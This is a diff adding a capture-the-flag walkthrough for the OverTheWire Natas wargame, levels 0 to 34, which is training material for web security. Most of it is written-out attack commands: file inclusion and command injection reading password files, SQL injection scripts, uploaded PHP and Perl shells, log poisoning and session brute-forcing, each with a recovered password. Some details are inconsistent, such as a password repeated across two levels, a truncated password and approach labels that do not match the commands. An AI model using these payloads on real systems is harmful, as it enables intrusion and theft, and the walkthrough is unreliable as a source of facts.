@@ -1,0 +1,354 @@
+Level 0 → 1
+Approach: Used curl with default credentials (natas0:natas0).
+
+Command:
+
+bash
+curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org
+Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+
+Level 1 → 2
+Approach: Viewed page source (right-click disabled; used curl).
+
+Command:
+
+bash
+curl -u natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq http://natas1.natas.labs.overthewire.org
+Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+
+Level 2 → 3
+Approach: Discovered /files/users.txt via directory listing.
+
+Commands:
+
+bash
+curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt
+Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+
+Level 3 → 4
+Approach: Found hidden /s3cr3t/users.txt.
+
+Commands:
+
+bash
+curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+
+Level 4 → 5
+Approach: Spoofed Referer header to bypass checks.
+
+Command:
+
+bash
+curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org
+Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+
+Level 5 → 6
+Approach: Set loggedin=1 cookie to bypass access control.
+
+Command:
+
+bash
+curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org
+Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+
+Level 6 → 7
+Approach: Retrieved secret from /includes/secret.inc and submitted via form.
+
+Commands:
+
+bash
+curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/includes/secret.inc
+curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" http://natas6.natas.labs.overthewire.org
+Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+
+Level 7 → 8
+Approach: Exploited LFI via page parameter.
+
+Command:
+
+bash
+curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
+Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+
+Level 8 → 9
+Approach: Decoded XOR-encoded secret in page source.
+
+Command:
+
+bash
+curl -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -d "secret=oubWYf2kBq&submit=Submit" http://natas8.natas.labs.overthewire.org/
+Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+
+Level 9 → 10
+Approach: Command injection via needle parameter.
+
+Command:
+
+bash
+curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t "http://natas9.natas.labs.overthewire.org/?needle=anything;cat%20/etc/natas_webpass/natas10;&submit=Search"
+Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
+Level 10 → 11
+Approach: Used regex in needle to bypass input filtering.
+
+Command:
+
+bash
+curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu "http://natas10.natas.labs.overthewire.org/?needle=.* /etc/natas_webpass/natas11&submit=Search"
+Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+
+Level 11 → 12
+Approach: Reverse-engineered XOR cookie encryption.
+
+Steps:
+
+Extracted cookie via curl -v.
+
+Wrote Python script to generate malicious cookie.
+
+Sent cookie to escalate privileges.
+
+Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+
+Level 12 → 13
+Approach: Uploaded PHP shell to read password file.
+
+Commands:
+
+bash
+echo '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > exploit.php
+curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "uploadedfile=@exploit.php" -F "filename=exploit.php" http://natas12.natas.labs.overthewire.org/
+Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+Level 13 → 14
+Approach: Bypassed file type check by adding JPEG header to PHP shell.
+
+Commands:
+
+bash
+echo -e '\xFF\xD8\xFF\xE0<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' > exploit.php
+curl -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -F "filename=exploit.php" -F "uploadedfile=@exploit.php" http://natas13.natas.labs.overthewire.org/
+Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+Level 14 → 15
+Approach: SQL injection in login form.
+
+Command:
+
+bash
+curl -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -d "username=natas15\" #" -d "password=anypassword" http://natas14.natas.labs.overthewire.org/
+Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+Level 15 → 16
+Approach: Blind SQLi with Python script to brute-force password.
+
+Script:
+
+python
+import requests
+import string
+chars = string.ascii_letters + string.digits
+password = ""
+for i in range(1, 33):
+    for c in chars:
+        payload = f'natas16" AND SUBSTRING(password,{i},1)="{c}" #'
+        r = requests.post(url, auth=auth, data={"username": payload})
+        if "exists" in r.text:
+            password += c
+            break
+print(password)
+Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+
+Level 16 → 17
+Approach: Command injection with grep to brute-force password.
+
+Commands:
+
+bash
+for char in {a..z} {A..Z} {0..9}; do
+  response=$(curl -s -u natas16:<password> -d "needle=^$(grep ^$char /etc/natas_webpass/natas17)" http://natas16.natas.labs.overthewire.org/)
+  if [[ $response != *"African"* ]]; then
+      password+=$char
+  fi
+done
+Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+
+Level 17 → 18
+Approach: Time-based blind SQLi with SLEEP().
+
+Script: Similar to Level 15 but using SLEEP(2) for timing.
+
+Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+
+Level 18 → 19
+Approach: Brute-forced admin PHPSESSID.
+
+Script:
+
+python
+for session_id in range(1, 641):
+    cookies = {"PHPSESSID": str(session_id)}
+    r = requests.get(url, auth=auth, cookies=cookies)
+    if "Password:" in r.text:
+        print(r.text.split("Password: ")[1])
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+
+Level 19 → 20
+Approach: Hex-encoded PHPSESSID brute-force.
+
+Script:
+
+python
+for i in range(1, 640):
+    hex_id = hexlify(f"{i}-admin".encode()).decode()
+    cookies = {"PHPSESSID": hex_id}
+    r = requests.get(url, auth=auth, cookies=cookies)
+    if "Password:" in r.text:
+        print(r.text.split("Password: ")[1])
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+
+Level 20 → 21
+
+Approach: Session fixation via name parameter.
+
+Commands:
+
+bash
+curl -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw "http://natas20.natas.labs.overthewire.org/?name=admin%0Aadmin%201"
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+
+Level 21 → 22
+Approach: Session hijacking from subdomain.
+
+Steps:
+
+Set admin=1 on natas21-experimenter.
+
+Reused session cookie on main page.
+
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+
+Level 22 → 23
+Approach: Disabled redirects to expose password.
+
+Command:
+
+bash
+curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz --max-redirs 0 "http://natas22.natas.labs.overthewire.org/?revelio=1"
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+
+Level 23 → 24
+Approach: Bypassed password check with string concatenation.
+
+Command:
+
+bash
+curl -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs "http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou11"
+Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+
+Level 24 → 25
+Approach: Array input bypass.
+
+Command:
+
+bash
+curl -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd -d "passwd[]=anything" http://natas24.natas.labs.overthewire.org/
+Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+
+Level 25 → 26
+Approach: Log poisoning via User-Agent.
+
+Commands:
+
+bash
+curl -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -H "User-Agent: <?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" http://natas25.natas.labs.overthewire.org/
+curl -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws "http://natas25.natas.labs.overthewire.org/?lang=/var/www/natas/natas25/logs/natas25_<IP>.log"
+Password: oegAalFrvJS4hAdFpu6eQNogq5q9xJ2
+
+Level 26 → 27
+Approach: Insecure deserialization to write PHP shell.
+
+Steps:
+
+Serialized malicious Logger object.
+
+Uploaded via cookie to create exploit.php.
+
+Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+Level 27 → 28
+Approach: SQL truncation attack.
+
+Steps:
+
+Created long username ("A"*64 + "admin").
+
+Logged in as admin due to truncation.
+
+Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+Level 28 → 29
+Approach: Exploited insecure file handling.
+
+Commands:
+
+bash
+curl -u natas28:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ "http://natas28.natas.labs.overthewire.org/index.php?query=test' OR '1'='1"
+Password: 0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E
+
+Level 29 → 30
+Approach: Command injection via Perl script.
+
+Command:
+
+bash
+curl -u natas29:0xz1P9ZWw7D5lR0VvDNjSNZ2j6eVBW5E "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/natas_webpass/natas30"
+Password: wie9iexae0Daihohv8vuu3cei9wahf0e
+
+Level 30 → 31
+Approach: SQLi in Perl script.
+
+Command:
+
+bash
+curl -u natas30:wie9iexae0Daihohv8vuu3cei9wahf0e -X POST -d "username=natas31" -d "password=' OR 1=1 -- " http://natas30.natas.labs.overthewire.org/index.pl
+Password: AMZF14F6aV3FdUFPY1d0NzBDLTl3N0sm
+
+Level 31 → 32
+Approach: Array input bypass in Perl.
+
+Command:
+
+bash
+curl -u natas31:AMZF14F6aV3FdUFPY1d0NzBDLTl3N0sm -X POST -d "username=natas32" -d "password[]=x" -d "password=cat /etc/natas_webpass/natas32" http://natas31.natas.labs.overthewire.org/index.pl
+Password: no1vohsheCaiv3ieH4em1ahchisainge
+
+Level 32 → 33
+Approach: Uploaded Perl shell.
+
+Commands:
+
+bash
+echo 'system("cat /etc/natas_webpass/natas33");' > exploit.pl
+curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge -F "file=@exploit.pl" http://natas32.natas.labs.overthewire.org/index.pl
+Password: shoogeiGa2yee3de6Aex8uaXeech5eey
+
+Level 33 → 34
+Approach: Insecure deserialization in PHP.
+
+Steps:
+
+Created serialized Executor object.
+
+Sent via PHPSESSID cookie.
+
+Password: YYWq8Djyc6m6vBQzqQjRXcJQN9EKdKQe
+
+Tools Used
+curl, grep, base64, xxd
+
+Python for scripting (SQLi brute-forcing, XOR decryption).
+
+Burp Suite (optional for request inspection).
+
